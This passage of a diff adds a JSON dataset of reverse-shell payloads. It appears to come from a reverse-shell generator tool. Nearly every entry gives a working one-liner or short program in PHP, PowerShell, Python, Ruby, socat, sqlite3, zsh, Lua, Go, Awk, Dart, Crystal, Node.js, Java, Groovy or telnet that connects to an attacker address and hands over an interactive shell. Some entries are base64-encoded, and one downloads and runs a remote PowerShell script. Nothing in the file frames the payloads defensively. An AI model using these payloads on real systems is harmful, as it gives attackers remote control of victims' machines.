+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);system(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'"
+        }
+      },
+      {
+        "OS": "PHP passthru",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);passthru(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'",
+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);passthru(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'"
+        }
+      },
+      {
+        "OS": "PHP `",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);`/bin/sh -i <&3 >&3 2>&3`;'",
+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);`/bin/sh -i <&3 >&3 2>&3`;'"
+        }
+      },
+      {
+        "OS": "PHP popen",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);popen(\\\"/bin/sh -i <&3 >&3 2>&3\\\", \\\"r\\\");'",
+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);popen(\\\"/bin/sh -i <&3 >&3 2>&3\\\", \\\"r\\\");'"
+        }
+      },
+      {
+        "OS": "PHP proc_open",
+        "payload_info": {
+          "payload_template": "php -r '$sock=fsockopen(\\\"10.10.10.10\\\",9001);$proc=proc_open(\\\"/bin/sh -i\\\", array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
+          "example": "php -r '$sock=fsockopen(\\\"10.200.1.151\\\",2026);$proc=proc_open(\\\"/bin/sh -i\\\", array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
+        }
+      },
+      {
+        "OS": "Windows ConPTY",
+        "payload_info": {
+          "payload_template": "",
+          "example": ""
+        }
+      },
+      {
+        "OS": "PowerShell #1",
+        "payload_info": {
+          "payload_template": "powershell -NoP -NonI -W Hidden -Exec Bypass -c \\\"New-Object System.Net.Sockets.TCPClient('10.10.10.10',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (ie x $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\\"",
+          "example": "powershell -NoP -NonI -W Hidden -Exec Bypass -c \\\"New-Object System.Net.Sockets.TCPClient('10.200.1.151',2026);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (ie x $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\\""
+        }
+      },
+      {
+        "OS": "PowerShell #2",
+        "payload_info": {
+          "payload_template": "powershell -nop -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:9001/powercat.ps1');powercat -c 10.10.10.10 -p 9001 -e cmd\\\"",
+          "example": "powershell -nop -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://10.200.1.151:2026/powercat.ps1');powercat -c 10.200.1.151 -p 2026 -e cmd\\\""
+        }
+      },
+      {
+        "OS": "PowerShell #3",
+        "payload_info": {
+          "payload_template": "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+          "example": "$client = New-Object System.Net.Sockets.TCPClient('10.200.1.151',2026);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+        }
+      },
+      {
+        "OS": "PowerShell #4 (TLS)",
+        "payload_info": {
+          "payload_template": "powershell -nop -exec bypass -c \\\"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\\"",
+          "example": "powershell -nop -exec bypass -c \\\"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object System.Net.Sockets.TCPClient('10.200.1.151',2026);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\\""
+        }
+      },
+      {
+        "OS": "PowerShell #3 (Base64)",
+        "payload_info": {
+          "payload_template": "powershell.exe -EncodedCommand IFsgPSAnMTAuMTAuMTAuMTAnOyRQID0gOTAwMTsgJGMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJFMsJFApOyRTID0gJGMuR2V0U3RyZWFtKCk7W2J5dGVbXV0kJGIgPSAwLi42NTUzNXx7MH07d2hpbGUoKCRpID0gJFMuUmVhZCgkYiwgMCwgJGIuTGVuZ3RoKSkgLW5lIDApeyRkID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZyhkYiwwLCAkaSk7JHNiID0gKGlleCAkZCAyPiYxIHwgT3V0LVN0cmluZyApOyRzYjIgPSAkc2IgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOyRzYiA9IFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJHNiMik7JFMuV3JpdGUoJHNiLDAsJHNiLkxlbmd0aCk7JFMuRmx1c2goKX07JGMuQ2xvc2UoKQ==",
+          "example": "powershell.exe -EncodedCommand IFsgPSAnMTAuMjAwLjEuMTUxJzskUCA9IDIwMjY7JGMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJFMsJFApOyRTID0gJGMuR2V0U3RyZWFtKCk7W2J5dGVbXV0kJGIgPSAwLi42NTUzNXx7MH07d2hpbGUoKCRpID0gJFMuUmVhZCgkYiwgMCwgJGIuTGVuZ3RoKSkgLW5lIDApeyRkID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZyhkYiwwLCAkaSk7JHNiID0gKGlleCAkZCAyPiYxIHwgT3V0LVN0cmluZyApOyRzYjIgPSAkc2IgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOyRzYiA9IFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoJHNiMik7JFMuV3JpdGUoJHNiLDAsJHNiLkxlbmd0aCk7JFMuRmx1c2goKX07JGMuQ2xvc2UoKQ=="
+        }
+      },
+      {
+        "OS": "Powny Shell (Webshell)",
+        "payload_info": {
+          "payload_template": "",
+          "example": ""
+        }
+      },
+      {
+        "OS": "Python #1",
+        "payload_info": {
+          "payload_template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.10.10\\\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'",
+          "example": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.200.1.151\\\",2026));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'"
+        }
+      },
+      {
+        "OS": "Python #2",
+        "payload_info": {
+          "payload_template": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.10.10\\\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"/bin/bash\\\");'",
+          "example": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.200.1.151\\\",2026));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"/bin/bash\\\");'"
+        }
+      },
+      {
+        "OS": "Python3 #1",
+        "payload_info": {
+          "payload_template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.10.10\\\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'",
+          "example": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.200.1.151\\\",2026));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'"
+        }
+      },
+      {
+        "OS": "Python3 #2",
+        "payload_info": {
+          "payload_template": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.10.10\\\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"/bin/bash\\\");'",
+          "example": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.200.1.151\\\",2026));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\\\"/bin/bash\\\");'"
+        }
+      },
+      {
+        "OS": "Python3 Windows",
+        "payload_info": {
+          "payload_template": "python3 -c 'import socket,os,threading,subprocess as sp;p=sp.Popen([\\\"cmd.exe\\\"],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\\\"10.10.10.10\\\",9001));threading.Thread(target=exec,args=(\\\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\\\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()' ",
+          "example": "python3 -c 'import socket,os,threading,subprocess as sp;p=sp.Popen([\\\"cmd.exe\\\"],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((\\\"10.200.1.151\\\",2026));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()' "
+        }
+      },
+      {
+        "OS": "Python3 shortest",
+        "payload_info": {
+          "payload_template": "python3 -c 'a=__import__;s=a(\\\"socket\\\");o=a(\\\"os\\\").dup2;p=a(\\\"pty\\\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\\\"10.10.10.10\\\",9001));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\\\"/bin/sh\\\")'",
+          "example": "python3 -c 'a=__import__;s=a(\\\"socket\\\");o=a(\\\"os\\\").dup2;p=a(\\\"pty\\\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\\\"10.200.1.151\\\",2026));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\\\"/bin/sh\\\")'"
+        }
+      },
+      {
+        "OS": "Ruby #1",
+        "payload_info": {
+          "payload_template": "ruby -rsocket -e'f=TCPSocket.open(\\\"10.10.10.10\\\",9001).to_i;exec sprintf(\\\"/bin/sh -i <&%d >&%d 2>&%d\\\",f,f,f)'",
+          "example": "ruby -rsocket -e'f=TCPSocket.open(\\\"10.200.1.151\\\",2026).to_i;exec sprintf(\\\"/bin/sh -i <&%d >&%d 2>&%d\\\",f,f,f)'"
+        }
+      },
+      {
+        "OS": "Ruby no sh",
+        "payload_info": {
+          "payload_template": "ruby -rsocket -e \\\"exit if fork;c=TCPSocket.new('10.10.10.10','9001');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end\\\"",
+          "example": "ruby -rsocket -e \\\"exit if fork;c=TCPSocket.new('10.200.1.151','2026');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end\\\""
+        }
+      },
+      {
+        "OS": "socat #1",
+        "payload_info": {
+          "payload_template": "socat tcp-connect:10.10.10.10:9001 exec:sh,pty,stderr,setsid,sigint,sane",
+          "example": "socat tcp-connect:10.200.1.151:2026 exec:sh,pty,stderr,setsid,sigint,sane"
+        }
+      },
+      {
+        "OS": "socat #2 (TTY)",
+        "payload_info": {
+          "payload_template": "socat file:`tty`,raw,echo=0 tcp-listen:9001",
+          "example": "socat file:`tty`,raw,echo=0 tcp-listen:2026"
+        }
+      },
+      {
+        "OS": "sqlite3 nc mkfifo",
+        "payload_info": {
+          "payload_template": "sqlite3 /dev/null \\\".shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f\\\"",
+          "example": "sqlite3 /dev/null \\\".shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.200.1.151 2026 >/tmp/f\\\""
+        }
+      },
+      {
+        "OS": "zsh",
+        "payload_info": {
+          "payload_template": "zsh -c 'zmodload zsh/net/tcp && ztcp 10.10.10.10 9001 && zsh >&$reply 2>&$reply 0>&$reply'",
+          "example": "zsh -c 'zmodload zsh/net/tcp && ztcp 10.200.1.151 2026 && zsh >&$reply 2>&$reply 0>&$reply'"
+        }
+      },
+      {
+        "OS": "Lua #1",
+        "payload_info": {
+          "payload_template": "lua -e \\\"require('socket');require('os');t=socket.tcp();t:connect('10.10.10.10','9001');os.execute('sh -i <&3 >&3 2>&3');\\\"",
+          "example": "lua -e \\\"require('socket');require('os');t=socket.tcp();t:connect('10.200.1.151','2026');os.execute('sh -i <&3 >&3 2>&3');\\\""
+        }
+      },
+      {
+        "OS": "Lua #2",
+        "payload_info": {
+          "payload_template": "lua5.1 -e 'local host, port = \\\"10.10.10.10\\\", 9001 local socket = require(\\\"socket\\\"); local tcp = socket.tcp(); local io = require(\\\"io\\\"); tcp:connect(host, port); io.stdin:close(); while true do local s, status, partial = tcp:receive(); local data = s or partial; if status == \\\"closed\\\" then break end local f = io.popen(data, \\\"r\\\"); local out = f:read(\\\"*a\\\"); f:close(); tcp:send(out) end'",
+          "example": "lua5.1 -e 'local host, port = \\\"10.200.1.151\\\", 2026 local socket = require(\\\"socket\\\"); local tcp = socket.tcp(); local io = require(\\\"io\\\"); tcp:connect(host, port); io.stdin:close(); while true do local s, status, partial = tcp:receive(); local data = s or partial; if status == \\\"closed\\\" then break end local f = io.popen(data, \\\"r\\\"); local out = f:read(\\\"*a\\\"); f:close(); tcp:send(out) end'"
+        }
+      },
+      {
+        "OS": "Golang",
+        "payload_info": {
+          "payload_template": "echo 'package main;import\\\"os/exec\\\";import\\\"net\\\";func main(){c,_:=net.Dial(\\\"tcp\\\",\\\"10.10.10.10:9001\\\");cmd:=exec.Command(\\\"/bin/sh\\\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rev.go && go run /tmp/rev.go",
+          "example": "echo 'package main;import\\\"os/exec\\\";import\\\"net\\\";func main(){c,_:=net.Dial(\\\"tcp\\\",\\\"10.200.1.151:2026\\\");cmd:=exec.Command(\\\"/bin/sh\\\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rev.go && go run /tmp/rev.go"
+        }
+      },
+      {
+        "OS": "Vlang",
+        "payload_info": {
+          "payload_template": "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\\\"nc -e sh 10.10.10.10 9001 0>&1\\\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
+          "example": "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\\\"nc -e sh 10.200.1.151 2026 0>&1\\\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"
+        }
+      },
+      {
+        "OS": "Awk",
+        "payload_info": {
+          "payload_template": "awk 'BEGIN {s = \\\"/inet/tcp/0/10.10.10.10/9001\\\"; while(42) { do{ printf \\\"shell>\\\" >s; getline cmd < s; while ((cmd |& getline) > 0) print $0 > s; close(cmd); } while(cmd != \\\"exit\\\") close(s); wait(null); } }' /dev/null",
+          "example": "awk 'BEGIN {s = \\\"/inet/tcp/0/10.200.1.151/2026\\\"; while(42) { do{ printf \\\"shell>\\\" >s; getline cmd < s; while ((cmd |& getline) > 0) print $0 > s; close(cmd); } while(cmd != \\\"exit\\\") close(s); wait(null); } }' /dev/null"
+        }
+      },
+      {
+        "OS": "Dart",
+        "payload_info": {
+          "payload_template": "import 'dart:io';\\nimport 'dart:convert';\\n\\nmain() {\\n  Socket.connect(\\\"10.10.10.10\\\", 9001).then((socket) {\\n    socket.listen((data) {\\n      Process.start('sh', []).then((Process process) {\\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\\n        process.stdout.handleError((error) {process.stdout.close();});\\n        process.stderr.handleError((error) {process.stderr.close();});\\n        process.stdout.listen((data) { socket.write(new String.fromCharCodes(data)); });\\n        process.stderr.listen((data) { socket.write(new String.fromCharCodes(data)); });\\n      });\\n    });\\n    socket.done.then((_) { socket.close(); });\\n  });\\n}",
+          "example": "import 'dart:io';\\nimport 'dart:convert';\\n\\nmain() {\\n  Socket.connect(\\\"10.200.1.151\\\", 2026).then((socket) {\\n    socket.listen((data) {\\n      Process.start('sh', []).then((Process process) {\\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\\n        process.stdout.handleError((error) {process.stdout.close();});\\n        process.stderr.handleError((error) {process.stderr.close();});\\n        process.stdout.listen((data) { socket.write(new String.fromCharCodes(data)); });\\n        process.stderr.listen((data) { socket.write(new String.fromCharCodes(data)); });\\n      });\\n    });\\n    socket.done.then((_) { socket.close(); });\\n  });\\n}"
+        }
+      },
+      {
+        "OS": "Crystal (system)",
+        "payload_info": {
+          "payload_template": "crystal -e \\\"require \\\"socket\\\" ; require \\\"process\\\"; Socket.tcp('10.10.10.10', 9001) {|s| Process.new(\\\"/bin/sh\\\", input: s, output: s, error: s).wait }\\\"",
+          "example": "crystal -e \\\"require \\\"socket\\\" ; require \\\"process\\\"; Socket.tcp('10.200.1.151', 2026) {|s| Process.new(\\\"/bin/sh\\\", input: s, output: s, error: s).wait }\\\""
+        }
+      },
+      {
+        "OS": "Crystal (code)",
+        "payload_info": {
+          "payload_template": "require \\\"process\\\"\\nrequire \\\"socket\\\"\\n\\nc = Socket.tcp(Socket::Family::INET)\\nc.connect(\\\"10.10.10.10\\\", 9001)\\nloop do \\n  m, l = c.receive\\n  p = Process.new(m.rstrip(\\\"\\n\\\"), output:Process::Redirect::Pipe, shell:true)\\n  c << p.output.gets_to_end\\nend",
+          "example": "require \\\"process\\\"\\nrequire \\\"socket\\\"\\n\\nc = Socket.tcp(Socket::Family::INET)\\nc.connect(\\\"10.200.1.151\\\", 2026)\\nloop do \\n  m, l = c.receive\\n  p = Process.new(m.rstrip(\\\"\\n\\\"), output:Process::Redirect::Pipe, shell:true)\\n  c << p.output.gets_to_end\\nend"
+        }
+      },
+      {
+        "OS": "node.js",
+        "payload_info": {
+          "payload_template": "require('child_process').exec('nc -e /bin/sh 10.10.10.10 9001')",
+          "example": "require('child_process').exec('nc -e /bin/sh 10.200.1.151 2026')"
+        }
+      },
+      {
+        "OS": "node.js #2",
+        "payload_info": {
+          "payload_template": "var net = require('net');var cp = require('child_process');var sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(9001, '10.10.10.10', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});",
+          "example": "var net = require('net');var cp = require('child_process');var sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect(2026, '10.200.1.151', function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});"
+        }
+      },
+      {
+        "OS": "Java #1",
+        "payload_info": {
+          "payload_template": "Runtime r = Runtime.getRuntime();Process p = r.exec(\\\"/bin/bash -c 'exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done'\\\");p.waitFor();",
+          "example": "Runtime r = Runtime.getRuntime();Process p = r.exec(\\\"/bin/bash -c 'exec 5<>/dev/tcp/10.200.1.151/2026;cat <&5 | while read line; do $line 2>&5 >&5; done'\\\");p.waitFor();"
+        }
+      },
+      {
+        "OS": "Java #2",
+        "payload_info": {
+          "payload_template": "String host=\\\"10.10.10.10\\\";int port=9001;String cmd=\\\"/bin/sh\\\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
+          "example": "String host=\\\"10.200.1.151\\\";int port=2026;String cmd=\\\"/bin/sh\\\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+        }
+      },
+      {
+        "OS": "Java #3",
+        "payload_info": {
+          "payload_template": "Runtime.getRuntime().exec(new String[]{\\\"/bin/sh\\\",\\\"-c\\\",\\\"exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done\\\"});",
+          "example": "Runtime.getRuntime().exec(new String[]{\\\"/bin/sh\\\",\\\"-c\\\",\\\"exec 5<>/dev/tcp/10.200.1.151/2026;cat <&5 | while read line; do $line 2>&5 >&5; done\\\"});"
+        }
+      },
+      {
+        "OS": "Java Web",
+        "payload_info": {
+          "payload_template": "",
+          "example": ""
+        }
+      },
+      {
+        "OS": "Java Two Way",
+        "payload_info": {
+          "payload_template": "",
+          "example": ""
+        }
+      },
+      {
+        "OS": "Javascript",
+        "payload_info": {
+          "payload_template": "var spawn = require('child_process').spawn; var net = require('net'); var client = new net.Socket(); client.connect(9001, \\\"10.10.10.10\\\", function(){client.pipe(spawn('sh', []).stdin); spawn('sh', []).stdout.pipe(client); spawn('sh', []).stderr.pipe(client);});",
+          "example": "var spawn = require('child_process').spawn; var net = require('net'); var client = new net.Socket(); client.connect(2026, \\\"10.200.1.151\\\", function(){client.pipe(spawn('sh', []).stdin); spawn('sh', []).stdout.pipe(client); spawn('sh', []).stderr.pipe(client);});"
+        }
+      },
+      {
+        "OS": "Groovy",
+        "payload_info": {
+          "payload_template": "String host=\\\"10.10.10.10\\\";int port=9001;String cmd=\\\"sh\\\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
+          "example": "String host=\\\"10.200.1.151\\\";int port=2026;String cmd=\\\"sh\\\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+        }
+      },
+      {
+        "OS": "telnet",
+        "payload_info": {
+          "payload_template": "TF=$(mktemp -u);mkfifo $TF && telnet 10.10.10.10 9001 0<$TF | sh 1>$TF",
+          "example": "TF=$(mktemp -u);mkfifo $TF && telnet 10.200.1.151 2026 0<$TF | sh 1>$TF"
+        }
+      }
+    ]
+  }
